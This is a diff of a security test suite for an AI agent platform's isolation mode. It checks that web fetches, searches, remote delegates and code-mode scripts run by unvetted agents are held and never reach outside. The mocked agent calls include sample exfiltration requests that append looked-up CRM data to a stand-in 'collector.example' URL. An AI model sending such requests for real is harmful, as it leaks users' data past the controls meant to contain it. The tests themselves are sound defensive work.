@@ -27,12 +27,14 @@ from pydantic_ai.models.function import AgentInfo, FunctionModel
 from pydantic_ai.tools import ToolDefinition
 from pydantic_ai.toolsets import AbstractToolset, FunctionToolset
 
-from app.agents.capabilities import REGISTRY, load_builtins
+from app.agents.a2a_delegate import a2a_delegate, held_a2a_delegate
+from app.agents.capabilities import REGISTRY, CapabilityBinding, load_builtins
 from app.agents.capabilities import get as get_capability
 from app.agents.capabilities.approval import ApprovalGate
 from app.agents.deps import AgentDeps
 from app.agents.factory import build_agent
 from app.agents.isolation import (
+    LIVE_IN_ISOLATION,
     MAX_RECORDED_ARGS_CHARS,
     CallRow,
     IsolationGuard,
@@ -42,6 +44,7 @@ from app.agents.isolation import (
     ToolRecording,
     capability_tools,
     classify,
+    kept_local,
     normalized_args,
     recorded_args,
     recorded_calls,
@@ -49,8 +52,17 @@ from app.agents.isolation import (
 from app.agents.mcp import MCP_ISOLATION
 from app.agents.model_resolver import ModelRequestSpec, ResolvedCredential
 from app.agents.spec import AgentSpec
+from app.agents.subagent_runtime import (
+    SUBAGENT_RUNTIME_RESOURCE,
+    ResolvedSubagent,
+    SubagentRuntime,
+)
 from app.core.secret_kinds import ApiKeySecret
 from app.db.models.intercepted_tool_call import InterceptionOutcome, InterceptionReason
+from app.services.agent_runner import _answers_of
+from app.services.eval_run_worker import trajectory
+from app.services.scorers import score_trajectory, scored_calls
+from app.services.transcript import tool_calls_in
 
 pytestmark = [pytest.mark.anyio, pytest.mark.security]
 
@@ -67,11 +79,18 @@ class _World:
         self.effects: list[tuple[str, str]] = []
 
     def toolset(
-        self, tool: str, *, test: bool, read_only: bool, trusted: bool = True
+        self,
+        tool: str,
+        *,
+        test: bool,
+        read_only: bool,
+        trusted: bool = True,
+        closed_world: bool = True,
     ) -> AbstractToolset[Any]:
         """One MCP-shaped tool: stamped with its origin, annotated by its server.
 
-        `trusted` is whether its connection believes the server's annotations.
+        `trusted` is whether its connection believes the server's annotations;
+        `closed_world` is the server saying `openWorldHint: false`.
         """
         toolset: FunctionToolset[Any] = FunctionToolset()
         effects = self.effects
@@ -84,28 +103,33 @@ class _World:
         return toolset.with_metadata(
             **{
                 MCP_ISOLATION: {"test": test, "trust_read_only_hints": trusted},
-                "annotations": {"readOnlyHint": read_only},
+                "annotations": {
+                    "readOnlyHint": read_only,
+                    **({"openWorldHint": False} if closed_world else {}),
+                },
             }
         )
 
 
+def _answer(
+    messages: list[ModelMessage], calls: tuple[tuple[str, dict[str, Any]], ...]
+) -> ModelResponse:
+    if len(messages) == 1:
+        return ModelResponse(
+            parts=[
+                ToolCallPart(tool_name=name, args=args, tool_call_id=f"call-{n}")
+                for n, (name, args) in enumerate(calls)
+            ]
+        )
+    returned = [
+        str(part.content) for part in messages[-1].parts if isinstance(part, ToolReturnPart)
+    ]
+    return ModelResponse(parts=[TextPart(" | ".join(returned))])
+
+
 def _calls_then_answers(*calls: tuple[str, dict[str, Any]]) -> FunctionModel:
     """A model that asks for every call at once, then answers with what it saw."""
-
-    def respond(messages: list[ModelMessage], _info: AgentInfo) -> ModelResponse:
-        if len(messages) == 1:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(tool_name=name, args=args, tool_call_id=f"call-{n}")
-                    for n, (name, args) in enumerate(calls)
-                ]
-            )
-        returned = [
-            str(part.content) for part in messages[-1].parts if isinstance(part, ToolReturnPart)
-        ]
-        return ModelResponse(parts=[TextPart(" | ".join(returned))])
-
-    return FunctionModel(respond)
+    return FunctionModel(lambda messages, _info: _answer(messages, calls))
 
 
 async def _run(
@@ -369,7 +393,9 @@ class TestClassification:
 
         tools = capability_tools(spec)
 
-        assert tools["look_up_note"] == ToolClass("capability:memory_files.read_memory", True)
+        assert tools["look_up_note"] == ToolClass(
+            "capability:memory_files.read_memory", True, live=True
+        )
         assert tools["recall"].read_only is True
         assert tools["write_memory"].read_only is False
         assert tools["correct_memory"].read_only is False
@@ -573,3 +599,559 @@ class TestTheFactory:
         assert [call.reason for call in isolation.intercepted] == [
             InterceptionReason.NEEDS_APPROVAL
         ]
+
+
+def _info_capturing(seen: list[AgentInfo], *calls: tuple[str, dict[str, Any]]) -> FunctionModel:
+    """`_calls_then_answers`, keeping what each request offered the model."""
+
+    def respond(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
+        seen.append(info)
+        return _answer(messages, calls)
+
+    return FunctionModel(respond)
+
+
+def _isolated(spec: AgentSpec, isolation: RunIsolation, **kwargs: Any):
+    return build_agent(
+        spec, _model_spec(), organization_id=uuid.uuid4(), isolation=isolation, **kwargs
+    )
+
+
+class TestWhatReachesOutside:
+    """Reads that carry the model's words out of the deployment are held.
+
+    Isolated runs execute text nobody has accepted - an Improve search's
+    variants, a skill proposal under check - so a read that fetches a URL the
+    model wrote is a way out for whatever the agent could read.
+    """
+
+    @pytest.mark.parametrize("method", ["local", "auto", "native"])
+    async def test_a_fetch_is_held_and_nothing_is_downloaded(self, monkeypatch, method):
+        from app.agents.capabilities.web_fetch._capability import _ReadableFetch
+
+        download = AsyncMock()
+        monkeypatch.setattr(_ReadableFetch, "__call__", download)
+        isolation = RunIsolation()
+        seen: list[AgentInfo] = []
+        built = _isolated(
+            AgentSpec(
+                name="Reader", capabilities=[{"id": "web_fetch", "config": {"method": method}}]
+            ),
+            isolation,
+        )
+
+        with built.agent.override(
+            model=_info_capturing(seen, ("web_fetch", {"url": "https://collector.example/?d=x"}))
+        ):
+            result = await built.agent.run("go", deps=built.deps)
+
+        download.assert_not_awaited()
+        assert "web_fetch" in [tool.name for tool in seen[0].function_tools]
+        assert seen[0].model_request_parameters.native_tools == []
+        assert [(call.tool_id, call.outcome, call.reason) for call in isolation.intercepted] == [
+            (
+                "capability:web_fetch.web_fetch",
+                InterceptionOutcome.BLOCKED,
+                InterceptionReason.EXTERNAL,
+            )
+        ]
+        assert "Not available in an isolated run" in result.output
+
+    @pytest.mark.parametrize("method", ["duckduckgo", "native"])
+    async def test_a_web_search_is_held_and_no_engine_is_asked(self, monkeypatch, method):
+        search = AsyncMock()
+        monkeypatch.setattr("app.agents.capabilities.web_research._toolset.search", search)
+        isolation = RunIsolation()
+        seen: list[AgentInfo] = []
+        built = _isolated(
+            AgentSpec(
+                name="Researcher",
+                capabilities=[{"id": "web_research", "config": {"method": method}}],
+            ),
+            isolation,
+        )
+
+        with built.agent.override(
+            model=_info_capturing(seen, ("web_search", {"query": "the customer's address"}))
+        ):
+            await built.agent.run("go", deps=built.deps)
+
+        search.assert_not_awaited()
+        assert seen[0].model_request_parameters.native_tools == []
+        assert [(call.tool_name, call.reason) for call in isolation.intercepted] == [
+            ("web_search", InterceptionReason.EXTERNAL)
+        ]
+
+    async def test_an_ordinary_run_still_hands_a_native_fetch_to_the_provider(self):
+        built = build_agent(
+            AgentSpec(
+                name="Reader", capabilities=[{"id": "web_fetch", "config": {"method": "native"}}]
+            ),
+            _model_spec(),
+            organization_id=uuid.uuid4(),
+        )
+        seen: list[AgentInfo] = []
+
+        def answer(_messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
+            seen.append(info)
+            return ModelResponse(parts=[TextPart("read")])
+
+        with built.agent.override(model=FunctionModel(answer)):
+            await built.agent.run("go", deps=built.deps)
+
+        assert [tool.kind for tool in seen[0].model_request_parameters.native_tools] == [
+            "web_fetch"
+        ]
+        assert "web_fetch" not in [tool.name for tool in seen[0].function_tools]
+
+    async def test_an_open_world_read_is_held_even_on_a_trusted_connection(self):
+        """`readOnlyHint` says the server changes nothing; a server that reaches the
+        open web can still be handed anything as an argument."""
+        world = _World()
+        isolation = RunIsolation()
+
+        await _run(
+            isolation,
+            [
+                world.toolset("web_lookup", test=False, read_only=True, closed_world=False),
+                world.toolset("crm_find", test=False, read_only=True, closed_world=True),
+                world.toolset("sandbox_lookup", test=True, read_only=True, closed_world=False),
+            ],
+            _calls_then_answers(
+                ("web_lookup", {"name": "Ada"}),
+                ("crm_find", {"name": "Ada"}),
+                ("sandbox_lookup", {"name": "Ada"}),
+            ),
+        )
+
+        assert Counter(world.effects) == Counter([("crm_find", "Ada"), ("sandbox_lookup", "Ada")])
+        assert [(call.tool_name, call.reason) for call in isolation.intercepted] == [
+            ("web_lookup", InterceptionReason.EXTERNAL)
+        ]
+
+    async def test_a_live_read_from_a_recording_is_only_one_that_stays_inside(self):
+        world = _World()
+        isolation = RunIsolation(recording=ToolRecording([]), live_reads=True)
+
+        await _run(
+            isolation,
+            [
+                world.toolset("web_lookup", test=False, read_only=True, closed_world=False),
+                world.toolset("crm_find", test=False, read_only=True),
+            ],
+            _calls_then_answers(("web_lookup", {"name": "Ada"}), ("crm_find", {"name": "Ada"})),
+        )
+
+        assert world.effects == [("crm_find", "Ada")]
+        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
+            ("web_lookup", InterceptionOutcome.DIVERGENT)
+        ]
+
+    async def test_a_recorded_fetch_is_replayed_without_reaching_anything(self, monkeypatch):
+        from app.agents.capabilities.web_fetch._capability import _ReadableFetch
+
+        download = AsyncMock()
+        monkeypatch.setattr(_ReadableFetch, "__call__", download)
+        isolation = RunIsolation(
+            recording=ToolRecording(
+                [
+                    RecordedCall(
+                        "capability:web_fetch.web_fetch",
+                        normalized_args({"url": "https://docs.example/a"}),
+                        "the page as it was",
+                    )
+                ]
+            )
+        )
+        built = _isolated(AgentSpec(name="Reader", capabilities=[{"id": "web_fetch"}]), isolation)
+
+        with built.agent.override(
+            model=_calls_then_answers(("web_fetch", {"url": "https://docs.example/a"}))
+        ):
+            result = await built.agent.run("go", deps=built.deps)
+
+        download.assert_not_awaited()
+        assert result.output == "the page as it was"
+
+
+class TestTheListOfLiveReads:
+    """Which registry tools an isolated run executes is written down, not inferred."""
+
+    #: Read-only by declaration and held anyway, because each reaches outside.
+    HELD_READS = frozenset(
+        {
+            "capability:artifacts.preview_artifact",
+            "capability:visuals.preview_visual",
+            "capability:channel_actions.find_chat_channels",
+            "capability:channel_actions.list_chat_connections",
+            "capability:channel_actions.read_chat_messages",
+            "capability:channel_tools.get_channel_info",
+            "capability:channel_tools.list_channel_members",
+            "capability:channel_tools.read_channel_history",
+            "capability:channel_tools.search_channels",
+            "capability:channel_tools.send_channel_file",
+            "capability:web_fetch.web_fetch",
+            "capability:web_research.web_search",
+        }
+    )
+
+    @staticmethod
+    def _read_only_tools() -> set[str]:
+        return {
+            f"capability:{definition.id}.{tool.id}"
+            for definition in REGISTRY.values()
+            for tool in definition.tools
+            if definition.tool_is_read_only(tool)
+        }
+
+    def test_every_tool_on_the_list_exists_and_only_reads(self):
+        assert self._read_only_tools() >= LIVE_IN_ISOLATION
+
+    def test_every_read_off_the_list_was_held_on_purpose(self):
+        """A new read-only tool fails here until somebody decides which side it is on."""
+        assert self._read_only_tools() - LIVE_IN_ISOLATION == self.HELD_READS
+
+    def test_grading_and_the_platforms_own_agents_keep_every_tool(self):
+        """A judge, a classifier and the improver read through these and nothing else."""
+        from app.agents.system_agents import SYSTEM_CAPABILITIES
+
+        reads = {
+            f"capability:{definition.id}.{tool.id}"
+            for definition in REGISTRY.values()
+            if definition.id in SYSTEM_CAPABILITIES
+            for tool in definition.tools
+        }
+
+        assert reads <= LIVE_IN_ISOLATION
+
+    def test_a_tool_off_the_list_is_held_although_it_only_reads(self):
+        spec = AgentSpec(name="Reader", capabilities=[{"id": "web_fetch"}, {"id": "knowledge"}])
+
+        tools = capability_tools(spec)
+
+        assert tools["web_fetch"] == ToolClass("capability:web_fetch.web_fetch", read_only=True)
+        assert tools["search_documents"].live is True
+
+    def test_a_binding_with_nothing_handed_to_the_provider_is_built_as_written(self):
+        written = CapabilityBinding(capability_id="web_fetch", config={"method": "local"})
+        native = CapabilityBinding(capability_id="web_research", config={"method": "native"})
+
+        assert kept_local(written) is written
+        assert kept_local(CapabilityBinding(capability_id="knowledge")).config == {}
+        assert kept_local(native).config == {"method": "duckduckgo"}
+
+    def test_a_disabled_binding_is_left_unread(self):
+        """Its stored config may predate the schema; a binding that builds nothing must not
+        fail an eval over it."""
+        stale = CapabilityBinding(
+            capability_id="web_fetch", config={"method": "carrier-pigeon"}, enabled=False
+        )
+
+        assert kept_local(stale) is stale
+
+
+class TestRemoteDelegates:
+    """A delegate that is another system's agent is a way out like a fetch."""
+
+    @staticmethod
+    def _runtime(send: AsyncMock) -> SubagentRuntime:
+        local = ResolvedSubagent(
+            name="agent-mailer",
+            description="Drafts mail",
+            build=lambda: Agent(
+                FunctionModel(lambda *_: ModelResponse(parts=[TextPart("drafted")])),
+                output_type=str,
+            ),
+        )
+        remote = ResolvedSubagent(
+            name="reviewer",
+            description="Reviews contracts elsewhere",
+            build=a2a_delegate(
+                handle="reviewer",
+                endpoint="https://remote.example/a2a",
+                card_url="https://remote.example/.well-known/agent.json",
+                bearer="remote-key",
+            ),
+            remote=True,
+        )
+        return SubagentRuntime(subagents=(local, remote), depth_remaining=1)
+
+    async def test_a_task_for_a_remote_agent_is_held_and_never_sent(self, monkeypatch):
+        send = AsyncMock()
+        monkeypatch.setattr("app.agents.a2a_delegate.send_message", send)
+        isolation = RunIsolation()
+        built = _isolated(
+            AgentSpec(name="Lead", capabilities=[{"id": "subagents"}]),
+            isolation,
+            resources={SUBAGENT_RUNTIME_RESOURCE: self._runtime(send)},
+        )
+
+        with built.agent.override(
+            model=_calls_then_answers(
+                ("task", {"description": "Review clause 4", "subagent_type": "reviewer"}),
+                ("task", {"description": "Draft a reply", "subagent_type": "agent-mailer"}),
+            )
+        ):
+            result = await built.agent.run("go", deps=built.deps)
+
+        send.assert_not_awaited()
+        assert [
+            (call.tool_name, call.args["subagent_type"], call.reason)
+            for call in isolation.intercepted
+        ] == [("task", "reviewer", InterceptionReason.EXTERNAL)]
+        assert "drafted" in result.output
+
+    async def test_the_held_delegate_answers_without_its_endpoint(self, monkeypatch):
+        send = AsyncMock()
+        monkeypatch.setattr("app.agents.a2a_delegate.send_message", send)
+
+        result = await held_a2a_delegate(handle="reviewer")().run("Review clause 4")
+
+        send.assert_not_awaited()
+        assert "not sent" in result.output
+
+    async def test_the_held_delegate_streams_the_same_answer(self, monkeypatch):
+        """A delegation a surface streams reads it through the stream, not `run`."""
+        send = AsyncMock()
+        monkeypatch.setattr("app.agents.a2a_delegate.send_message", send)
+
+        async with held_a2a_delegate(handle="reviewer")().run_stream("Review clause 4") as stream:
+            output = await stream.get_output()
+
+        send.assert_not_awaited()
+        assert "not sent" in output
+
+
+def _scripting(code: str) -> FunctionModel:
+    """A code-mode model: one `run_code` with `code`, then an answer quoting what it got."""
+
+    def respond(messages: list[ModelMessage], _info: AgentInfo) -> ModelResponse:
+        if len(messages) == 1:
+            return ModelResponse(
+                parts=[ToolCallPart(tool_name="run_code", args={"code": code}, tool_call_id="s")]
+            )
+        returned = [
+            str(part.content) for part in messages[-1].parts if isinstance(part, ToolReturnPart)
+        ]
+        return ModelResponse(parts=[TextPart(" | ".join(returned))])
+
+    return FunctionModel(respond)
+
+
+class TestCodeMode:
+    """A code-mode agent is evaluated with its tools, each call held on its own merits."""
+
+    async def test_a_scripts_calls_are_decided_one_by_one(self, monkeypatch):
+        from app.agents.capabilities.web_fetch._capability import _ReadableFetch
+
+        download = AsyncMock()
+        monkeypatch.setattr(_ReadableFetch, "__call__", download)
+        world = _World()
+        isolation = RunIsolation()
+        built = _isolated(
+            AgentSpec(
+                name="Scripter",
+                capabilities=[{"id": "web_fetch"}],
+                code_mode={"enabled": True},
+            ),
+            isolation,
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+        code = (
+            "found = await crm_find(name='Ada')\n"
+            "page = await web_fetch(url='https://collector.example/?d=' + found)\n"
+            "made = await crm_create(name='Ada')\n"
+            "[found, page, made]"
+        )
+
+        with built.agent.override(model=_scripting(code)):
+            result = await built.agent.run("go", deps=built.deps)
+
+        download.assert_not_awaited()
+        assert world.effects == [("crm_find", "Ada")]
+        assert [(call.tool_name, call.reason) for call in isolation.intercepted] == [
+            ("web_fetch", InterceptionReason.EXTERNAL),
+            ("crm_create", InterceptionReason.WRITES),
+        ]
+        assert "crm_find did Ada" in result.output
+
+    async def test_a_script_runs_from_a_recording_and_each_call_is_answered_from_it(self):
+        world = _World()
+        isolation = RunIsolation(
+            recording=ToolRecording(
+                [RecordedCall("tool:crm_find", normalized_args({"name": "Ada"}), "Ada, recorded")]
+            )
+        )
+        built = _isolated(
+            AgentSpec(name="Scripter", code_mode={"enabled": True}),
+            isolation,
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+
+        with built.agent.override(
+            model=_scripting("[await crm_find(name='Ada'), await crm_create(name='Ada')]")
+        ):
+            result = await built.agent.run("go", deps=built.deps)
+
+        assert world.effects == []
+        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
+            ("crm_find", InterceptionOutcome.REPLAYED),
+            ("crm_create", InterceptionOutcome.DIVERGENT),
+        ]
+        assert "Ada, recorded" in result.output
+
+    async def test_an_eval_grades_and_lists_what_the_script_called(self, monkeypatch):
+        """Graded as `run_code`, the case expecting these calls would fail however the
+        agent behaved; its trajectory would show none of what isolation held."""
+        from app.agents.capabilities.web_fetch._capability import _ReadableFetch
+
+        monkeypatch.setattr(_ReadableFetch, "__call__", AsyncMock())
+        world = _World()
+        isolation = RunIsolation()
+        built = _isolated(
+            AgentSpec(
+                name="Scripter", capabilities=[{"id": "web_fetch"}], code_mode={"enabled": True}
+            ),
+            isolation,
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+        code = (
+            "found = await crm_find(name='Ada')\n"
+            "page = await web_fetch(url='https://collector.example/?d=' + found)\n"
+            "await crm_create(name='Ada')"
+        )
+
+        with built.agent.override(model=_scripting(code)):
+            result = await built.agent.run("go", deps=built.deps)
+        calls = tool_calls_in(
+            result.new_messages(), scripts=built.deps.code_continuations.script_calls
+        )
+        graded = score_trajectory(
+            [
+                {"tool": "crm_find", "args": {"name": "Ada"}},
+                {"tool": "web_fetch", "args": {}},
+                {"tool": "crm_create", "args": {}},
+            ],
+            list(
+                scored_calls(calls, blocked={call.tool_call_id for call in isolation.intercepted})
+            ),
+            order_mode="exact",
+            required=True,
+        )
+
+        assert graded is not None
+        assert graded.status == "pass"
+        assert [
+            (row["tool"], row["outcome"], row["reason"], row.get("parent"))
+            for row in trajectory(calls, isolation.intercepted)
+        ] == [
+            ("run_code", "executed", None, None),
+            ("crm_find", "executed", None, "s"),
+            ("web_fetch", "blocked", "external", "s"),
+            ("crm_create", "blocked", "writes", "s"),
+        ]
+
+    async def test_a_recorded_script_runs_again_and_each_call_is_answered_from_it(self):
+        """The recording offers the script's calls, not the script, so the replay's
+        own trajectory lists each call answered from the original run."""
+        code = "[await crm_find(name='Ada'), await crm_create(name='Ada')]"
+        spec = AgentSpec(name="Scripter", code_mode={"enabled": True})
+        source_world = _World()
+        source = build_agent(
+            spec,
+            _model_spec(),
+            organization_id=uuid.uuid4(),
+            extra_toolsets=[
+                source_world.toolset("crm_find", test=False, read_only=True),
+                source_world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+        with source.agent.override(model=_scripting(code)):
+            ran = await source.agent.run("go", deps=source.deps)
+        (script,) = tool_calls_in(
+            ran.new_messages(), scripts=source.deps.code_continuations.script_calls
+        )
+        world = _World()
+        isolation = RunIsolation(
+            recording=ToolRecording(recorded_calls(_answers_of(script), tools={}))
+        )
+        built = _isolated(
+            spec,
+            isolation,
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+
+        with built.agent.override(model=_scripting(code)):
+            result = await built.agent.run("go", deps=built.deps)
+
+        assert source_world.effects == [("crm_find", "Ada"), ("crm_create", "Ada")]
+        assert world.effects == []
+        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
+            ("crm_find", InterceptionOutcome.REPLAYED),
+            ("crm_create", InterceptionOutcome.REPLAYED),
+        ]
+        assert "crm_create did Ada" in result.output
+
+    @pytest.mark.parametrize(("failed", "taken"), [(True, "caught"), (False, "found")])
+    async def test_a_recorded_script_call_that_failed_fails_again_on_replay(self, failed, taken):
+        """A script that caught the error takes the same branch from a recording."""
+        isolation = RunIsolation(
+            recording=ToolRecording(
+                [
+                    RecordedCall(
+                        "tool:crm_find",
+                        normalized_args({"name": "Ada"}),
+                        "The tool failed.",
+                        failed=failed,
+                    )
+                ]
+            )
+        )
+        built = _isolated(
+            AgentSpec(name="Scripter", code_mode={"enabled": True}),
+            isolation,
+            extra_toolsets=[_World().toolset("crm_find", test=False, read_only=True)],
+        )
+        code = (
+            "try:\n"
+            "    await crm_find(name='Ada')\n"
+            "    taken = 'found'\n"
+            "except Exception:\n"
+            "    taken = 'caught'\n"
+            "taken"
+        )
+
+        with built.agent.override(model=_scripting(code)):
+            result = await built.agent.run("go", deps=built.deps)
+
+        assert taken in result.output
+        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
+            ("crm_find", InterceptionOutcome.REPLAYED)
+        ]
+
+    def test_only_code_modes_own_tool_is_a_script(self):
+        """A server can call its tool `run_code`; it cannot stamp it as code mode's."""
+        from app.agents.code_mode import CODE_MODE_ID
+
+        ours = ToolDefinition(name="run_code", capability_id=CODE_MODE_ID)
+        theirs = ToolDefinition(
+            name="run_code", metadata={MCP_ISOLATION: {"test": False}}, capability_id=CODE_MODE_ID
+        )
+        named_alike = ToolDefinition(name="run_code")
+
+        assert classify(ours, {}).script is True
+        assert classify(theirs, {}).script is False
+        assert classify(named_alike, {}).script is False
+        assert classify(named_alike, {}).read_only is False
